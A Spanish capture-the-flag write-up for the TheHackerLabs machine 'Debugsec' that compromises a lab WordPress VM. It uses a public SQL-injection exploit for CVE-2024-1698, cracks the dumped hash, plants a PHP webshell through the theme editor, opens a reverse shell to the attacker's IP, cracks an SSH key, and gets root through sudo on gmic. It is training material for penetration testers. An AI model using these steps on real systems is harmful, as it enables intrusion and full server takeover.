---
title: "Debugsec - TheHackerLabs"
date: 2025-07-22
draft: false
slug: "THL-writeup-debugsec"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que la página web activa del puerto 80, está utilizando Virtual Hosting, por lo que agregamos la IP y el dominio al /etc/hosts para que nos cargue bien la página. Ya en la página, vemos que fue hecha con WordPress y que solo tiene un usuario registrado, así que utilizamos WPScan para enumerarla y encontrar algún plugin que sea utilizado y sea vulnerable. Resulta que la página utiliza el plugin NotificarionX versión 2.8.2, que es vulnerable a Unauthenticated Blind SQL Injection. Investigando un poco, encontramos un Exploit en la página web de Vicarius que usamos para obtener el hash del administrador del sitio, mismo hash que logramos crackear con JohnTheRipper y usando al usuario que ya habíamos encontrado antes, logramos ganar acceso al login de WordPress. Dentro del login, modificamos el archivo PHP de un tema para que nos sirva como WebShell y nos podamos mandar una Reverse Shell, ganando acceso principal a la máquina víctima. Ya en la máquina víctima, descubrimos una llave privada id_rsa de un usuario, que logramos crackear y usar para ganar acceso a la máquina víctima vía SSH. Autenticados como el usuario de la máquina, vemos que tiene privilegios sudoers de Root sobre el binario gmic. Pues dicho binario permite la ejecución de comandos, así que solamente le indicamos que nos dé una sesión de Bash y la obtenemos, pero como Root, logrando escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "WordPress", "Gmic Binary", "Virtual Hosting", "Web Enumeration", "Fuzzing", "WordPress Enumeration", "Plugin notificationX Exploitation (CVE-2024-1698)", "Unauthenticated Blind SQL Injection", "CVE-2024-1698", "WordPress Theme Editor Abuse (RCE)", "Cracking Hash", "Cracking SSH Private Key", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "wpscan"
  - "python3"
  - "JohnTheRipper"
  - "nc"
  - "bash"
  - "cat"
  - "grep"
  - "chmod"
  - "ssh2john"
  - "ssh"
  - "sudo"
links:
  - "https://www.vicarius.io/vsociety/posts/exploiting-the-unexploited-unauthenticated-blind-sqli-in-notificationx-wordpress-plugin-cve-2024-1698-a-novel-exploit-for-novel-folks"
  - "https://github.com/kamranhasan/CVE-2024-1698-Exploit"
  - "https://gmic.eu/tutorial/command_guide.html#controlf"
  - "https://gmic.eu/reference/exec.html#top"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-debugsec/debugsec.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.210
PING 192.168.10.210 (192.168.10.210) 56(84) bytes of data.
64 bytes from 192.168.10.210: icmp_seq=1 ttl=64 time=4.69 ms
64 bytes from 192.168.10.210: icmp_seq=2 ttl=64 time=0.684 ms
64 bytes from 192.168.10.210: icmp_seq=3 ttl=64 time=1.26 ms
64 bytes from 192.168.10.210: icmp_seq=4 ttl=64 time=0.922 ms

--- 192.168.10.210 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3036ms
rtt min/avg/max/mdev = 0.684/1.890/4.693/1.631 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.210 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 11:32 CST
Initiating ARP Ping Scan at 11:32
Scanning 192.168.10.210 [1 port]
Completed ARP Ping Scan at 11:32, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:32
Scanning 192.168.10.210 [65535 ports]
Discovered open port 22/tcp on 192.168.10.210
Discovered open port 80/tcp on 192.168.10.210
Completed SYN Stealth Scan at 11:32, 8.61s elapsed (65535 total ports)
Nmap scan report for 192.168.10.210
Host is up, received arp-response (0.00056s latency).
Scanned at 2025-07-22 11:32:24 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solo dos puertos abiertos, por lo que es seguro que la intrusión será por la página web activa en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.210 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 11:32 CST
Nmap scan report for 192.168.10.210
Host is up (0.00085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 14:f7:d8:c3:33:07:81:51:da:fa:bf:4c:03:51:2a:94 (ECDSA)
|_  256 4d:2a:b5:82:f5:f0:88:3d:75:9d:f3:fe:27:30:a6:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Did not follow redirect to http://debugsec.thl/
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está diciendo que la página nos redirige a un dominio llamado **degubsec.thl**, por lo que seguramente se está aplicando **Virtual Hosting**.

Puedes registrarlo de una vez en el `/etc/hosts`:
```bash
echo "192.168.10.210 debugsec.thl" >> /etc/hosts
```
Ahora sí, visitemos la página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura1.png">
</p>

Nos carga bien. Si no hubiéramos registrado el dominio en el `/etc/hosts`, no podríamos ver la página.

Parece ser una página hecha en **WordPress**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura2.png">
</p>

Bien, nos está dando la versión de **WordPress** siendo la **6.3.4**.

Revisando un poco la página, encontramos una publicación y solamente aparece un usuario llamado **wordpress**:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura4.png">
</p>

No encontraremos algo más.

Vamos a aplicar **Fuzzing** por si hay algo oculto por ahí.

### Fuzzing {#fuzz}

Primero, usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.210/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.210/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wp-content              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 2ms]
wp-login.php            [Status: 200, Size: 7568, Words: 359, Lines: 116, Duration: 422ms]
index.php               [Status: 200, Size: 34459, Words: 1294, Lines: 260, Duration: 3092ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 21ms]
wp-includes             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 4ms]
readme.html             [Status: 200, Size: 7399, Words: 750, Lines: 98, Duration: 5ms]
wp-admin                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 38ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 501ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 20ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 21ms]
                        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 100ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 38ms]
:: Progress: [882180/882180] :: Job [1/1] :: 145 req/sec :: Duration: [0:05:34] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para indicar extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.210/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.210/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 34459]
/wp-content           (Status: 301) [Size: 323] [--> http://192.168.10.210/wp-content/]
/wp-login.php         (Status: 200) [Size: 7568]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 324] [--> http://192.168.10.210/wp-includes/]
/readme.html          (Status: 200) [Size: 7399]
/wp-admin             (Status: 301) [Size: 321] [--> http://192.168.10.210/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://debugsec.thl/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 280]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones de archivos a buscar. |

No veo algo como tal que haya sido creado por un usuario, pero lo que sí vemos, es el **xml-rpc** activo, por lo que podríamos aplicar fuerza bruta más adelante.

Vamos a enumerar la página de **WordPress** con **WPScan**.

### Enumeración de WordPress con WPScan {#WPScan}

Vamos a tratar de enumerar los plugins y veamos si existe otro usuario aparte del **usuario wordpress**:
```bash
wpscan --url http://debugsec.thl --enumerate vp,u --plugins-detection aggressive --no-banner
[i] It seems like you have not updated the database for some time.
 
[+] URL: http://debugsec.thl/ [192.168.10.210]
[+] Started: Tue Jul 22 12:04:59 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://debugsec.thl/robots.txt

 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%
...
...
[+] WordPress theme in use: twentytwentyone

 | Location: http://debugsec.thl/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://debugsec.thl/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://debugsec.thl/wp-content/themes/twentytwentyone/style.css?ver=1.9
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://debugsec.thl/wp-content/themes/twentytwentyone/style.css?ver=1.9, Match: 'Version: 1.9'

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:39 <============================================================================================================> (7343 / 7343) 100.00% Time: 00:02:39
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wordpress

 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://debugsec.thl/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://debugsec.thl/wp-json/oembed/1.0/embed?url=http://debugsec.thl/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul 22 12:07:44 2025
[+] Requests Done: 7399
[+] Cached Requests: 8
[+] Data Sent: 1.972 MB
[+] Data Received: 2.513 MB
[+] Memory used: 242.699 MB
[+] Elapsed time: 00:02:45
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |
| *--no-banner* | Para no mostrar el banner de la herramienta. |

El escaneo no pudo encontrar los plugins usados o un nuevo usuario.

Podemos intentar aplicarle fuerza bruta (que no funcionará), para ver si obtiene algún plugin:
```bash
wpscan --url http://debugsec.thl --password-attack xmlrpc -t 20 -U 'wordpress' -P /usr/share/wordlists/rockyou.txt --no-banner
[i] It seems like you have not updated the database for some time.
 
[+] URL: http://debugsec.thl/ [192.168.10.210]
[+] Started: Tue Jul 22 12:10:01 2025
...
[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] notificationx

 | Location: http://debugsec.thl/wp-content/plugins/notificationx/
 | Last Updated: 2025-03-24T09:55:00.000Z
 | [!] The version is out of date, the latest version is 3.0.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.8.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://debugsec.thl/wp-content/plugins/notificationx/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://debugsec.thl/wp-content/plugins/notificationx/README.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:03
...
[+] Finished: Tue Jul 22 12:10:08 2025
[+] Requests Done: 139
[+] Cached Requests: 41
[+] Data Sent: 35.082 KB
[+] Data Received: 68.662 KB
[+] Memory used: 262.695 MB
[+] Elapsed time: 00:00:07

Scan Aborted: The XML-RPC Interface was not detected.
```

| Parámetros | Descripción |
|---|---|
| *--password-attack* | Para elegir un ataque suministrado en lugar de determinar uno automáticamente. Puede ser `wp-login, xmlrpc, xmlrpc-multicall`|
| *-U*	     | Indica una lista de usuarios o un usuario. |
| *-P*	     | Indica un wordlist de contraseñas. |

Excelente, pudo detectar el uso del plugin **notificationx 2.8.2**.

Puede que este plugin sea vulnerable, por lo que necesitamos investigar y buscar un Exploit.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698 {#Exploit}

Investigando, encontramos que el plugin **notificationx 2.8.2** es vulnerable a **Blind SQL Injection**.

Aquí dejo el blog de **Vicarius** que explica bastante bien la vulnerabilidad y nos da un script que sirve para explotarla:
* <a href="https://www.vicarius.io/vsociety/posts/exploiting-the-unexploited-unauthenticated-blind-sqli-in-notificationx-wordpress-plugin-cve-2024-1698-a-novel-exploit-for-novel-folks" target="_blank">Exploiting the unexploited - Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698 - A novel exploit for novel folks</a>

A su vez, también podemos utilizar este Exploit de un usuario de **GitHub**:
* <a href="https://github.com/kamranhasan/CVE-2024-1698-Exploit" target="_blank">CVE-2024-1698 Exploit Script - Wordpress NotificationX <= 2.8.2 - SQL Injection</a>

Yo utilizaré el de **Vicarius**, solo tienes que copiarlo y guardarlo en tu máquina.

En resumen de este Exploit:
* El plugin **notificationx versión 2.8.2** es vulnerable a **Unauthenticated Blind SQL Injections** a través del parámetro **type** que se usa en la ruta `http://IP/wp-json/notificationx/v1/analytics`.
* El Exploit busca y obtiene el hash del **usuario admin** o del usuario que tenga el ID como 1.
* A través de una **petición POST**, podemos probar la **Blind SQLi**:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura5.png">
</p>

Veamos de qué forma se usa el Exploit:
```bash
python3 notificationx_Exploit.py
usage: notificationx_Exploit.py [-h] --url URL [--sleep-time SLEEP_TIME] [--debug]
notificationx_Exploit.py: error: the following arguments are required: --url
```
Solamente debemos darle la URL de la página web vulnerable. 

Podríamos darle la flag `--debug` y el `--sleep-time` para que nos vaya mostrando cada carácter encontrado, aunque no es necesario.

Vamos a ejecutarlo:
```bash
python3 notificationx_Exploit.py --url http://debugsec.thl
[+] The WordPress instance seems to be vulnerable to CVE-2024-1698.
[*] WordPress admin password hash: $P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx/
```
Tenemos el hash, así que guárdalo en un archivo.

Ahora con **JohnTheRipper** lo crackeamos: 
```bash
john -w:/usr/share/wordlists/rockyou.txt adminHash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******         (?)     
1g 0:00:00:14 DONE (2025-07-22 12:18) 0.07102g/s 21313p/s 21313c/s 21313C/s memee..may1889
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
Genial, tenemos la contraseña del administrador o, en este caso, del **usuario wordpress**.

Probémosla:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura6.png">
</p>

Estamos dentro.

### Modificando Tema con Editor de Temas para Crear WebShell y Ganando Acceso a la Máquina {#WebShell}

Podemos modificar un tema para que ejecute una **Reverse Shell** o para crear una **WebShell**. Yo haré lo segundo.

Del lado izquierdo, encontraremos el **Editor de Temas** en la sección **Apariencia**:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura7.png">
</p>

Entra ahí y harás lo siguiente:
* Selecciona un tema que no se esté usando.
* Revisa y usa uno de los archivos que ejecute código **PHP**.
* Modifícalo y agrega la siguiente instrucción para crear una **WebShell** (en caso de que quieras una **Reverse Shell**, aquí la puedes poner): `system($_GET['cmd']);`
* Guarda los cambios y recuerda la ruta donde se encuentra el archivo que usaste.

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura8.png">
</p>

Bien, ya solo tenemos que visitar nuestra **WebShell o Reverse Shell**.

Sería esta ruta: `http://IP/wp-content/themes/Nombre_Tema_Usado/pattern/archivo_usado.php`

Probémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura9.png">
</p>

Ya tenemos nuestra **WebShell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Ejecuta la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-debugsec/Captura10.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.210] 54246
bash: cannot set terminal process group (520): Inappropriate ioctl for device
bash: no job control in this shell
<html/wp-content/themes/twentytwentythree/patterns$ whoami
whoami
www-data
```

Ya solo obtén una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4: 
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Listo.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa {#linEnum}

Veamos qué usuarios existen:
```bash
www-data@debugsec:/var/www/html$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
debugsec:x:1001:1001::/home/debugsec:/bin/bash
```
Solo existe el **usuario debugsec**.

Podemos ver su directorio y su contenido, pero no podremos ver la flag aún:
```bash
www-data@debugsec:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Jun 28  2024 .
drwxr-xr-x 18 root     root     4096 Jun 28  2024 ..
drwxr-xr-x  4 debugsec debugsec 4096 Jun 29  2024 debugsec
www-data@debugsec:/var/www/html$ ls -la /home/debugsec/ 
total 32
drwxr-xr-x 4 debugsec debugsec 4096 Jun 29  2024 .
drwxr-xr-x 3 root     root     4096 Jun 28  2024 ..
lrwxrwxrwx 1 root     root        9 Jun 28  2024 .bash_history -> /dev/null
-rw-r--r-- 1 debugsec debugsec  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 debugsec debugsec 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 debugsec debugsec 4096 Jun 29  2024 .local
-rw-r--r-- 1 debugsec debugsec  807 Apr 23  2023 .profile
drwx------ 2 debugsec debugsec 4096 Jun 28  2024 .ssh
-r-------- 1 debugsec debugsec   36 Jun 29  2024 user.txt
```

Buscando un poco, encontramos algo interesante en el directorio `/opt`:
```bash
www-data@debugsec:/var/www/html$ ls -la /opt
total 12
drwxr-xr-x  2 root     root     4096 Jun 28  2024 .
drwxr-xr-x 18 root     root     4096 Jun 28  2024 ..
-rwxr-xr-x  1 debugsec debugsec 3434 Jun 28  2024 id_rsa
```
Resulta ser la llave privada del **usuario debugsec** y la podemos leer.

Cópiala en tu máquina, dale los permisos correctos y obtén su hash con la herramienta **ssh2john**:
```bash
nano id_rsa
-----------
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1...
...
-----------
chmod 600 id_rsa
ssh2john id_rsa > hash
```

Con **JohnTheRipper** la intentamos crackear:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pangga           (id_rsa)     
1g 0:00:01:22 DONE (2025-07-22 12:59) 0.01205g/s 36.46p/s 36.46c/s 36.46C/s lance..love06
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la frase usada en la **llave privada id_rsa**.

Vamos a autenticarnos como el **usuario debugsec**:
```bash
ssh -i id_rsa debugsec@192.168.10.210
Enter passphrase for key 'id_rsa': 
Linux debugsec 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
Last login: Tue Jul 22 20:59:52 2025
debugsec@debugsec:~$ whoami
debugsec
```
Funcionó.

Ahora sí podemos leer la flag del usuario:
```bash
debugsec@debugsec:~$ ls
user.txt
debugsec@debugsec:~$ cat user.txt
...
```

### Escalando Privilegios Abusando de los Privilegios Sudoers sobre Binario gmic {#gmic}

Veamos qué privilegios tiene nuestro usuario:
```bash
debugsec@debugsec:~$ sudo -l
Matching Defaults entries for debugsec on debugsec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debugsec may run the following commands on debugsec:
    (root) NOPASSWD: /usr/bin/gmic
```
Muy bien, podemos usar el **binario gmic** como **Root**.

El problema es que no conozco este binario, así que vamos a investigar de qué se trata:

| **GREYC's Magic for Image Computing** |
|:--------------:|
| *gmic (o G'MIC) es un framework de procesamiento de imágenes muy poderoso, que se puede usar desde línea de comandos, con su propia sintaxis de scripting, o mediante interfaces gráficas como GIMP o Krita.* |

Investigando la forma de uso de este binario, resulta que podemos ejecutar algunos comandos que son para control de flujo:
* <a href="https://gmic.eu/tutorial/command_guide.html#controlf" target="_blank">G'MIC - Flow Control</a>

Y tenemos un comando que puede estar compilado en el binario, siendo el comando **exec**:
* <a href="https://gmic.eu/reference/exec.html#top" target="_blank">G'MIC - Flow Control: exec</a>

Parece que solo tenemos que indicarle el comando que queremos ejecutar.

Vamos a probarlo con el comando **id**:
```bash
debugsec@debugsec:~$ sudo /usr/bin/gmic exec "id"
[gmic]-0./ Start G'MIC interpreter.
[gmic]-0./ Execute external command 'id' in verbose mode.
uid=0(root) gid=0(root) grupos=0(root)

[gmic]-0./ End G'MIC interpreter.
```
Excelente, funciona.

Entonces, le podemos pedir una sesión de bash y nos tendría que dar una sesión del **Root**:
```bash
debugsec@debugsec:~$ sudo /usr/bin/gmic exec "/bin/bash"
[gmic]-0./ Start G'MIC interpreter.
[gmic]-0./ Execute external command '/bin/bash' in verbose mode.
root@debugsec:/home/debugsec# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
root@debugsec:/home/debugsec# cd /root
root@debugsec:~# ls
gmic  root.txt
root@debugsec:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
